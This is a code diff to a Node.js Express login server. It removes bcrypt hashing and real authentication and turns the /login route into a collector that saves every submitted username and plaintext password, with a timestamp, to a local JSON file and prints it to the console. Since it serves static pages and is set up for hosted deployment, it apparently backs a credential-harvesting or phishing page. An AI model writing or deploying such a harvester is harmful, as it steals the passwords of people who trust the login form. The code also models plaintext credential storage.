@@ -2,14 +2,17 @@ const express = require('express');
 const path = require('path');
 const bodyParser = require('body-parser');
 const session = require('express-session');
-const bcrypt = require('bcryptjs'); // ✅ Use bcryptjs instead of bcrypt
+const fs = require('fs'); // ✅ For saving login data
 
 const app = express();
-const users = []; // Temporary storage
 
+// Middleware for reading form data
 app.use(bodyParser.urlencoded({ extended: true }));
+
+// Serve static files (HTML, CSS, JS)
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Session (not really used, but okay to leave)
 app.use(
   session({
     secret: 'mysecretkey',
@@ -18,32 +21,47 @@ app.use(
   })
 );
 
-app.post('/register', (req, res) => {
-  const { username, password } = req.body;
-  const hashedPassword = bcrypt.hashSync(password, 10); // ✅ bcryptjs
-  users.push({ username, password: hashedPassword });
-  res.send('User registered successfully!');
-});
-
+// ✅ LOGIN ROUTE — Save attempts to JSON
 app.post('/login', (req, res) => {
   const { username, password } = req.body;
-  const user = users.find((u) => u.username === username);
 
-  if (!user) {
-    return res.status(400).send('User not found');
-  }
+  // Create a new entry
+  const newEntry = {
+    username: username,
+    password: password,
+    time: new Date().toLocaleString()
+  };
 
-  const isMatch = bcrypt.compareSync(password, user.password); // ✅ bcryptjs
+  const filePath = 'login-data.json';
 
-  if (!isMatch) {
-    return res.status(400).send('Incorrect password');
-  }
+  // Read existing file
+  fs.readFile(filePath, 'utf8', (err, data) => {
+    let loginData = [];
 
-  req.session.user = user;
-  res.send(`Welcome, ${username}!`);
+    if (!err && data) {
+      try {
+        loginData = JSON.parse(data);
+      } catch (e) {
+        console.error('Error parsing existing JSON, starting fresh.');
+      }
+    }
+
+    // Add the new attempt to the list
+    loginData.push(newEntry);
+
+    // Write updated list back to the file
+    fs.writeFile(filePath, JSON.stringify(loginData, null, 2), (err) => {
+      if (err) {
+        console.error('Error saving login data:', err);
+        return res.status(500).send('Error saving login attempt');
+      }
+      console.log('Saved login attempt:', newEntry);
+      res.send('Login data saved successfully!');
+    });
+  });
 });
 
-// ✅ Use Render's PORT instead of hardcoded 3000
+// ✅ Use Render's port OR default to 3000
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running at http://localhost:${PORT}`);
